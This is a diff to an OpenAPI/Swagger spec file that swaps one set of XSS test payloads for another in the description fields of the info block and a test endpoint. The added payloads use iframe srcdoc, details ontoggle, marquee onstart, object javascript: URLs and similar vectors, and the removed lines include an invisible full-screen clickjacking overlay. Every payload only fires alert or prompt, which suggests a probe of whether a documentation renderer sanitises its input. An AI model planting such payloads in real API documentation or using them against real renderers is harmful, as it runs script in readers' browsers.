@@ -4,9 +4,14 @@ info:
   version: "1.0.0"
   description: |
     <div style="background:yellow;padding:20px" onclick="alert('XSS Success!')">Click me!</div>
-    <body onload=prompt(1)></body>
-    <svg/onload=alert('SVG')>
-    <img src=x onerror=alert('imageXSS')>
+    <iframe srcdoc="<script>alert(1)</script>"></iframe>
+    <math><mtext></mtext><script>alert(2)</script></math>
+    <details open ontoggle=alert(3)>Click for XSS</details>
+    <input autofocus onfocus=alert(4)>
+    <marquee onstart=alert(5)>marquee</marquee>
+    <object data="javascript:alert(6)"></object>
+    <video><source onerror="alert(7)"></video>
+    <form><button formaction="javascript:alert(8)">formXSS</button></form>
 tags:
   - name: test
     description: |
@@ -23,9 +28,9 @@ paths:
     get:
       summary: "Test endpoint"
       description: |
-        <img src="x" style="position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.01;z-index:99999" onclick="alert('CLICKED!')" />
-        <svg/onload=alert('SVG2')>
-        <a href="javascript:alert('XSS2')">Another link</a>
+        <details open ontoggle=alert('TestDescXSS')>Swagger details XSS</details>
+        <marquee onstart=alert('TestDesc2XSS')>marquee2</marquee>
+        <object data="javascript:alert('TestDesc3XSS')"></object>
       responses:
         "200":
           description: |
